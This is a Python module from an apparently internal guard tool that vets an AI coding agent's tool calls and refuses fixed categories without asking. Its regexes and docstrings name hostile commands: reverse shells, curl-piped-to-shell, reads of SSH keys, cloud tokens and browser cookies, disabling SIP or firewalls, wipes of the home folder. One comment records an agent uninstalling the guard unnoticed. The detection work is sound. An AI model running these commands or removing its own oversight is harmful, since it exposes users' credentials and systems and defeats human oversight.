"""06.11 — the project's Constitution v1 (internal design note): the IMMUTABLE articles Н1-Н8 (+ Н10, r0305) the witness refuses by
itself, with no question.

Law: a question about a plain attack moves the work of the guard onto a tired person (approval fatigue; the owner's goal is <= 1 question a
day). An explicit attack is refused at once: the agent gets the reason and what to do instead (reasons.py), the owner gets a row in the
journal (status denied), and NOBODY is notified (actions.refuse: no pending approval, no push). What the classifier sees only in part
(a host from a variable, an opaque wrapper) is NOT here: it stays a question, as before -- a refusal is only for what is certain.

Each rule may only TIGHTEN: it is applied as a gateway deny (actions.submit: `gate = ("deny", code)`) after the core's dry decision, never to
a call the core already refuses, and it never turns anything into an allow. Inputs: the hook's `_witness` of the call (the classifier's
`danger` marks "kind:detail", `net`, `writes`, `commands`, `project`, `path`) and the command text.

Н10 (r0305, SHAG0-POLNYY-KONVEYER-1411): a program that switches off a protection of the operating system -- Gatekeeper / the
quarantine mark (xattr -d com.apple.quarantine, xattr -c, spctl --master-disable, LSQuarantine NO), SIP (csrutil disable), TCC
(tccutil reset), the firewall (pfctl -d, socketfilterfw --setglobalstate off, com.apple.alf, ufw disable, iptables -F), SELinux /
AppArmor / auditd (setenforce 0, systemctl stop apparmor), Defender (Set-MpPreference -DisableRealtimeMonitoring). The classifier's
mark `defense:<what>` (bashparse._defense_of; only the forms that switch OFF, never one that looks). MITRE T1553.001 / T1562. Like
Н4, the person turns such a protection off by hand in their own terminal, never through an agent; no mandate (`unlisted: allow`,
"from now on", the auto profile, the sandbox) makes it silent, because a gateway deny comes after every one of them.

Н3, self-protection (r0333, Я0 nabor-1 S126 17.11: `pip uninstall -y deus-witness` passed silently under `unlisted: allow` on 0.2.132):
the agent removes, stops or replaces the witness -- the package uninstalled by any installer (its name as the installer reads it: case,
- _ . alike), the witness's own program told to stop (`deus-witness unlock`), a kill whose target names it, a file of its installation
(site-packages, bin/deus-witness*, Claude Code's plugin, pipx / uv tools, its key and state) deleted / moved / chmod-ed / overwritten
outside the project, by Write / Edit too; through any carrier the classifier unwraps (bash -c, env, sudo, xargs, vim -c '!'). The
classifier's mark `witness-off` (bashparse._witness_off_of / _witness_line), the tool's path for Write / Edit (bashparse.witness_file).
After such a line no call is judged: a question would be the last one. The person removes it by hand in their own terminal.

Not here (and why) -- see the report of 06.11 (r0260):
  Н2 (secrets to the network): the core already refuses a credential-shaped value in a call to a domain the mandate lists (DLP tags ->
     DATA_NOT_PERMITTED / RECIPIENT) and every shell exit is a question; a scanner of a git diff before push needs facts the hook does not
     send yet.
  Н7 opaque outside the sandbox: on the owner's corpus most opaque lines are harmless note edits outside the project; a refusal there would
     refuse harmless work (the safety valve "harmless refused: 0"). Kept a question.
  Н9: the owner's refusal already blocks the same act in other words for the window (actions.refused_like, deny_key, 15 min); a refused
     article is refused again by the same rule in any wrapper the classifier sees through.
"""
from __future__ import annotations

import posixpath
import re

# codes (no digits: docs/internal/coverage.md's table is matched by [A-Z_]+)
SECRET = "FORBIDDEN_SECRET_READ"          # Н1
GUARD = "FORBIDDEN_GIT_HOOKS"             # Н3
AUTOSTART = "FORBIDDEN_AUTOSTART"         # Н4 (and the agent's own settings / the witness: Н3)
WIPE = "FORBIDDEN_WIPE"                   # Н5
REMOTE_SHELL = "FORBIDDEN_REMOTE_SHELL"   # Н6
HIDDEN = "FORBIDDEN_HIDDEN_CHARS"         # Н7
FORCE_PUSH = "FORBIDDEN_FORCE_PUSH"       # Н8
DEFENSE = "FORBIDDEN_DEFENSE_OFF"         # Н10 (r0305): a protection of the operating system switched off
WITNESS_OFF = "FORBIDDEN_WITNESS_OFF"     # Н3 (r0333): the witness itself removed, stopped or replaced
CODES = (SECRET, GUARD, WITNESS_OFF, AUTOSTART, WIPE, REMOTE_SHELL, HIDDEN, FORCE_PUSH, DEFENSE)   # article order (catalog.n_articles)

_LOOPBACK = re.compile(r"^(localhost|127(\.\d{1,3}){3}|::1|\[::1\]|0\.0\.0\.0)$", re.I)

# Н1: credentials whose content is the user's identity. Narrower than bashparse.SECRET_NAME (which also asks about ~/.ssh/config,
# known_hosts, *.pub, a project's .env): only files that ARE a private key / token store. A path the classifier names in a `secrets:` mark.
_SECRET_FILE = re.compile(
    r"(?i)(^|/)("
    r"\.ssh/(id_(rsa|dsa|ecdsa|ed25519)(_sk)?|identity|[^/]+\.(pem|key))|"                       # ssh private keys (not *.pub, config, known_hosts)
    r"\.aws/credentials|\.aws/sso/cache/[^/]+|"
    r"\.gnupg/(private-keys-v1\.d(/.*)?|secring\.gpg)|"
    r"\.netrc|\.git-credentials|\.docker/config\.json|\.kube/config|\.config/gh/hosts\.ya?ml|"
    r"\.config/gcloud/(credentials\.db|access_tokens\.db|application_default_credentials\.json|legacy_credentials(/.*)?)|"
    r"\.azure/(accessTokens\.json|msal_token_cache\.(json|bin))|"
    r"Library/Keychains(/.*)?|"
    r"Library/Application Support/(Google/Chrome|BraveSoftware/Brave-Browser|Microsoft Edge|Chromium)/[^/]+/(Cookies|Login Data)|"
    r"Library/Application Support/Firefox/Profiles/[^/]+/(cookies\.sqlite|logins\.json|key4\.db)|"
    r"Library/Cookies(/.*)?"
    r")$")
_LOOK_ONLY = {"ls", "stat", "test", "[", "[[", "du", "file", "wc", "sha256sum", "sha1sum", "sha512sum", "shasum", "md5", "md5sum", "b2sum",
              "cksum", "ssh-keygen", "realpath", "readlink", "basename", "dirname"}
_KEYCHAIN = re.compile(r"(?i)^security (find-(generic|internet)-password|dump-keychain|export)")

# Н3: git hooks (any case, `.git.` / `.git ` as on APFS / NTFS: bashparse.GIT_EXEC_PATH), and core.hooksPath set for this or a later call
_GIT_HOOKS = re.compile(r"(?i)/\.git[. ]*/(.+/)?hooks(/|$)")
_HOOKSPATH_SET = re.compile(
    r"(?i)(?:^|[\s;&|(])(?:-c\s*['\"]?\s*core\.hookspath\s*=|--config-env[=\s]+['\"]?core\.hookspath=|"
    r"GIT_CONFIG_KEY_\d+=['\"]?core\.hookspath\b|GIT_CONFIG_PARAMETERS=[^\n]*core\.hookspath)")
_FILE_WRITE_TOOLS = ("Write", "Write.danger", "Write.outside", "Edit", "MultiEdit", "NotebookEdit")
# r0345: a hook manager told to skip the hooks (husky: HUSKY=0 / HUSKY_SKIP_HOOKS; pre-commit: SKIP=<ids>) on a git line that runs them
_HOOK_SKIP_ENV = re.compile(r"(?:^|[\s;&|(`'\"])(?:export\s+|env\s+(?:-\S+\s+)*)?(?:HUSKY=['\"]?(?:0|false)\b|HUSKY_SKIP_HOOKS=\S|SKIP=['\"]?[\w,.-]+)")
_GIT_HOOKED = re.compile(r"(?:^|[\s;&|(`'\"/])git\b(?:\s+-\S+(?:\s+\S+)?)*?\s+(?:commit|push|merge|rebase|am|cherry-pick|revert|checkout|switch)\b")
_WRITERS = {"cp", "mv", "ln", "install", "chmod", "tee", "touch", "rsync", "ditto", "dd", "rm", "sed", "perl", "truncate", "patch"}

# Н5: what is above the project (the home folder, /Users, /) or a system top directory
_SYSTEM = {"/", "/Users", "/home", "/System", "/Library", "/Applications", "/usr", "/bin", "/sbin", "/etc", "/var", "/private", "/opt",
           "/private/etc", "/private/var", "/Volumes", "/root"}
_HOME_WORDS = {"~", "~/", "$HOME", "${HOME}", "$HOME/", "${HOME}/", "\"$HOME\"", "/"}

# Н6: a fetcher at a command position (the line's start, after ; & | ( $( ` or `-c '`) piped into a shell / interpreter that reads its
# PROGRAM from stdin (no -c / -e / -m / script argument: `| python3 -c '...'` parses JSON, it runs no downloaded code); process
# substitution `bash <(curl ..)`; `bash -c "$(curl ..)"` / `eval "$(curl ..)"`. Scanned on the line without heredoc bodies.
_FETCH = r"(?:sudo\s+)?(?:env\s+(?:\S+=\S*\s+)*)?(?:\S*/)?(?:curl|wget|aria2c|fetch|https?|xh)\b"
_CMDPOS = r"(?:^|[;&|(\n]|\$\(|`|-c\s+['\"])\s*(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)*"
_SHELLS = r"(?:sudo\s+(?:-\S+\s+)*)?(?:env\s+(?:\S+=\S*\s+)*)?(?:\S*/)?(?:sh|bash|zsh|dash|ksh|fish|python[0-9.]*|node|perl|ruby|php)"
_PIPE_RUN = re.compile(_CMDPOS + _FETCH + r"[^|;&\n]*\|\s*" + _SHELLS + r"(?:\s+-[a-z]*s\b[^;&|\n]*|\s+-(?=\s|$|[;&|)'\"])|)\s*(?:$|[;&|)'\"\n])", re.I)
_SUBST_RUN = re.compile(r"(?:^|[;&|(\s])(?:sh|bash|zsh|source|\.)\s+<\(\s*" + _FETCH + r"|"
                        r"(?:^|[;&|(\s])(?:(?:sh|bash|zsh)\s+-c|eval)\s+['\"]?\$\(\s*" + _FETCH, re.I)

# Н6: a reverse shell / a listener (a program that hands a shell to the network or waits for it)
_REVERSE = re.compile(
    r"(?i)(/dev/(tcp|udp)/[^\s/]+/\d+[^\n]*(0>&1|>&\s*/dev/|-i\b)|"                               # bash -i >& /dev/tcp/h/p 0>&1
    r"(?:^|[\s;&|(])(nc|ncat|netcat)\b[^;&|\n]*\s-(?:[a-z]*[ec])\s*\S*(sh|bash|zsh|python|perl)\b|"  # nc -e /bin/sh
    r"(?:^|[\s;&|(])(nc|ncat|netcat)\b[^;&|\n]*\s-[a-z]*l|"                                         # nc -l / -lvp (a listener)
    r"\bsocat\b[^\n]*(exec:|system:|tcp-listen|tcp4-listen|tcp6-listen)|"
    r"\bmkfifo\b[^\n]*\b(nc|ncat|netcat)\b)")

# Н7: characters that change what the person reads without changing what the shell runs (Trojan Source, CVE-2021-42574)
_BIDI = re.compile("[‪-‮⁦-⁩‎‏؜]")
_ZW = "​‌‍⁠﻿᠎"


def _witness(args):
    w = args.get("_witness") if isinstance(args, dict) else None
    return w if isinstance(w, dict) else {}


def _marks(w):
    out = []
    for d in w.get("danger") or []:
        if isinstance(d, str):
            k, _, det = d.partition(":")
            out.append((k, det))
    return out


def _hidden(text):
    """Н7: a bidi control anywhere, or a zero-width character next to an ASCII letter / digit / punctuation (inside a word the shell runs).
    A zero-width joiner BETWEEN two emoji (a family, a flag) is text, not a trick: allowed."""
    if not isinstance(text, str):
        return None
    m = _BIDI.search(text)
    if m:
        return "U+%04X" % ord(m.group(0))
    for i, ch in enumerate(text):
        if ch in _ZW:
            nb = (text[i - 1] if i > 0 else " ", text[i + 1] if i + 1 < len(text) else " ")
            if any(0x21 <= ord(c) <= 0x7e for c in nb):
                return "U+%04X" % ord(ch)
    return None


def _wipe_target(det, project):
    """Н5: the target of a recursive delete / chmod the classifier marked (`rm-rf:<abs path>`, `rm-rf:chmod -R 777 ~`) is the root, a system
    top directory, the home folder or any folder that CONTAINS the project (so: the home folder, without knowing it). Else None."""
    t = det.strip()
    if t.startswith("chmod "):
        last = t.split()[-1] if t.split() else ""
        if re.match(r"chmod\s+(-[A-Za-z]*R[A-Za-z]*\s+)+[0-7]*7[0-7]*\s", t) or re.match(r"chmod\s+-R\s+[ugoa]*\+[rwx]*w", t):
            if last in _HOME_WORDS or (last.startswith("/") and _contains_project(last, project)):
                return t
        return None
    if t in _HOME_WORDS:
        return t
    if not t.startswith("/"):
        return None
    p = posixpath.normpath(t)
    if p in _SYSTEM or _contains_project(p, project):
        return p
    return None


def _contains_project(p, project):
    if not isinstance(project, str) or not project.startswith("/"):
        return False
    p = posixpath.normpath(p).rstrip("/") or "/"
    pr = posixpath.normpath(project).rstrip("/")
    return p == "/" or pr == p or pr.startswith(p + "/")


def _hosts(w):
    out = []
    for n in w.get("net") or []:
        if isinstance(n, str):
            out.append(n.rsplit("@", 1)[-1].strip("[]").lower())
    return out


def check(tool, args):
    """-> (code, detail) of the first immutable article the call breaks, or None. Pure: no I/O."""
    if not isinstance(tool, str) or not isinstance(args, dict):
        return None
    w = _witness(args)
    marks = _marks(w)
    cmd = args.get("command") if tool.startswith("Bash") and isinstance(args.get("command"), str) else None
    project = w.get("project") if isinstance(w.get("project"), str) else None
    # Н7 first: what the person would read is not what runs
    h = _hidden(cmd)
    if h is None and tool in ("Write", "Write.danger", "Edit", "MultiEdit", "NotebookEdit", "Read", "Read.secret"):
        h = _hidden(w.get("path")) if isinstance(w.get("path"), str) else None
    if h is not None:
        return HIDDEN, h
    # Н8: force-push, a deleted / mirrored / pruned remote branch (bashparse._git: -f, --force*, --force-with-lease*, +refspec, :ref,
    # --delete / -d, --mirror, --prune), in any wrapper the classifier unwraps (bash -c, env, a variable, git -C)
    for k, det in marks:
        if k == "git-force-push":
            return FORCE_PUSH, det[:200]
    # Н3 (r0333): the witness itself removed / stopped / replaced (bashparse.WITNESS_OFF), a Write / Edit of a file of its installation
    for k, det in marks:
        if k == "witness-off":
            return WITNESS_OFF, det[:200]
    if tool in ("Write", "Write.danger", "Write.outside", "Edit", "MultiEdit", "NotebookEdit") and isinstance(w.get("path"), str):
        try:
            from app.hookjudge.bashparse import witness_file
            if witness_file(w["path"], None, project):
                return WITNESS_OFF, w["path"][:200]
        except Exception:  # noqa: BLE001 -- a path we cannot read: no refusal here (it stays the question it was)
            pass
    # Н4 (+ Н3 for the agent's settings / the witness): a place that runs at the next login / shell / session (bashparse.PERSIST_PATH)
    for k, det in marks:
        if k == "persist":
            return AUTOSTART, det[:200]
    # Н10 (r0305): an OS protection switched off (bashparse.DEFENSE)
    for k, det in marks:
        if k == "defense":
            return DEFENSE, det[:200]
    # Н3: git hooks and core.hooksPath
    for k, det in marks:
        if k == "git-config" and (det.lower().startswith("config core.hookspath") or _GIT_HOOKS.search(det)):
            return GUARD, det[:200]
        # r0319 (RT 15.11 П4): the hooks of every new repository (init.templateDir, `git init|clone --template`), the whole git
        # directory written by a program whose text the line does not show (`tar -xf h.tar -C .git`: hooks/ among it), and a
        # hooksPath written straight into git's config file (`printf '[core]\n hooksPath = h' >> .git/config`)
        if k == "git-config" and re.match(r"(?i)(config init\.templatedir|(init|clone) --template)", det):
            return GUARD, det[:200]
        if k == "git-config" and re.search(r"(?i)/\.git[. ]*/?$", det):
            return GUARD, det[:200]
        if k == "git-config" and cmd is not None and re.search(r"(?i)/\.git[. ]*/config(\.worktree)?$", det) and re.search(r"(?i)hooks\s*path", cmd):
            return GUARD, det[:200]
    if cmd is not None:
        if _HOOKSPATH_SET.search(cmd):
            return GUARD, "core.hooksPath"
        for p in w.get("writes") or []:
            if isinstance(p, str) and _GIT_HOOKS.search(p):
                return GUARD, p[:200]
        heads = [h_.split(" ", 1)[0].rsplit("/", 1)[-1] for h_ in (w.get("commands") or []) if isinstance(h_, str)]
        if set(heads) & _WRITERS and re.search(r"(?i)(^|[\s'\"=/])\.git[. ]*/(\S+/)?hooks(/|\s|$|['\"])", cmd) \
                and any("[protected]" in h_ or "protected" in h_ for h_ in (w.get("commands") or []) if isinstance(h_, str)):
            return GUARD, ".git/hooks"
    # Н5: recursive delete / chmod of the root, a system directory, the home folder or a folder above the project
    for k, det in marks:
        if k == "rm-rf":
            t = _wipe_target(det, project)
            if t is not None:
                return WIPE, t[:200]
    # Н6: a download piped into a shell from a host that is not this machine; a reverse shell or a listener
    if cmd is not None and any(k == "pipe-to-shell" for k, _ in marks) and any(h_ and not _LOOPBACK.match(h_) for h_ in _hosts(w)):
        try:
            from app.hookjudge.bashparse import _normalize
            al_ = w.get("alias_line") if isinstance(w.get("alias_line"), str) else cmd   # r0319 (Б1): `./c` linked to curl is curl
            bare = _normalize(al_)[0]                    # heredoc bodies out: a document that SHOWS `curl x | sh` runs nothing
            bare0 = _normalize(cmd)[0] if al_ != cmd else bare     # r0338: the line as written is read too (the canonical one only adds)
        except Exception:  # noqa: BLE001 -- a line we cannot cut: no refusal here (it stays the question it was)
            bare = bare0 = None
        m = (_PIPE_RUN.search(bare) or _SUBST_RUN.search(bare)) if isinstance(bare, str) else None
        if m is None and isinstance(bare0, str) and bare0 is not bare:
            m = _PIPE_RUN.search(bare0) or _SUBST_RUN.search(bare0)
        if m:
            return REMOTE_SHELL, m.group(0).strip()[:200]
    if cmd is not None:
        m = _REVERSE.search(cmd)
        # r0329 (закон носителя): the commands a carrier was handed (`vim -c '!nc -e /bin/sh h p'`: bashparse._carried) are read too
        for t in ([] if m else [t_ for t_ in (w.get("carried") or []) if isinstance(t_, str)]):
            m = _REVERSE.search(t)
            if m:
                break
        if m:
            return REMOTE_SHELL, m.group(0)[:200]
    # Н1: reading a private key / token store / the keychain / browser cookies. A line whose every program only looks AT the file (ls,
    # stat, test, a digest, a size) reads no secret: it stays what it was (a question), never refused here.
    heads0 = {h_.split(" ", 1)[0].rsplit("/", 1)[-1] for h_ in (w.get("commands") or []) if isinstance(h_, str)}
    if tool.startswith("Bash") and heads0 and heads0 <= _LOOK_ONLY:
        return None
    for k, det in marks:
        if k == "secrets":
            p = det.split(" (read as ", 1)[0].strip()
            if _SECRET_FILE.search(p) or _KEYCHAIN.match(p):
                return SECRET, p[:200]
    # r0345 (closed exam 1, EX1-184): a write tool on a private key / token store OUTSIDE the project (mapping marks it write-outside):
    # the same bytes through the shell are refused Н1 (`echo x > ~/.ssh/id_ed25519`); Write replaces the identity (an empty text erases
    # the key; ~/.aws/credentials, ~/.kube/config `exec:`, ~/.docker/config.json `credsStore`, ~/.netrc hand the next tool to the attacker)
    # and Edit shows the agent the file's lines. One act, one verdict.
    if tool in _FILE_WRITE_TOOLS and isinstance(w.get("path"), str) and _SECRET_FILE.search(w["path"]) \
            and any(k == "write-outside" for k, _ in marks):
        return SECRET, w["path"][:200]
    # r0345 (closed exam 1, EX1-118): the git hooks switched off for one command -- `git commit --no-verify` / `-n`, `git push|merge|
    # rebase|am --no-verify` (classifier mark git-no-verify), a hook manager told to skip (HUSKY=0, HUSKY_SKIP_HOOKS, SKIP=<ids> of
    # pre-commit) on a git line that runs hooks. Law 7 / Н3: "switching off git hooks ... refused without a question".
    for k, det in marks:
        if k == "git-no-verify":
            return GUARD, det[:200]
    if cmd is not None and _HOOK_SKIP_ENV.search(cmd) and _GIT_HOOKED.search(cmd):
        return GUARD, _HOOK_SKIP_ENV.search(cmd).group(0).strip()[:200]
    return None
